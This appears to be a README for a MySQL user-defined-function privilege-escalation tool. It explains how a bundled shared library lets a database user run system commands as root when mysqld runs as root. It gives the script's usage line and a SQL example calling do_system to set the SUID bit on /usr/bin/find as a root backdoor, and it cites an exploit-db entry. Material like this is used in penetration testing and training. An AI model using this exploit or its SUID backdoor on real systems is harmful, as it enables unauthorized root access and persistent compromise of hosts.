# MySQL-UDF-PrivEsc
Using MySQL UDF to excute system commands
<br/>Prerequisites:
- mysqld must run as root (ps aux | grep mysqld)
- you must know the credentials of a MySQL user that has the permission to create stored function on the DBMS

# How does it works?
The script use UDF shared library on MySQL to execute commands on a system, if mysqld run as root, so the passed (-c)ommand will be executed as root. On a 64bit *nix box you can pass the compiled .so included in this repo.<br/>
How to use the script: <b>mysql_udf_exec_sys.sh -u mysql-user -p mysql-user-password -s shared-library-path -c command-to-be-executed</b> e.g.<br/>
<i>$ ./mysql_udf_exec_sys.sh -s lib_sys_udf.so -u root -p Secrete -c 'whoami > /tmp/whoM; chmod go+r /tmp/whoM;'</i><br>
  Once the script has been correctly executed you can direct access MySQL console and use the function do_system directly:<br>
<pre>mysql> use mysql;
mysql> select do_system('chmod u+s /usr/bin/find');
+--------------------------------------+
| do_system('chmod u+s /usr/bin/find') |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.00 sec)
</pre>
  
<br><br><b>Please have a look to the following resources to get specific information about the exploit: </b>
  - https://www.exploit-db.com/exploits/1518
  - MySQL UDF: https://mariadb.com/kb/en/library/create-function-udf 
  - Shared library soname: https://en.wikipedia.org/wiki/Soname
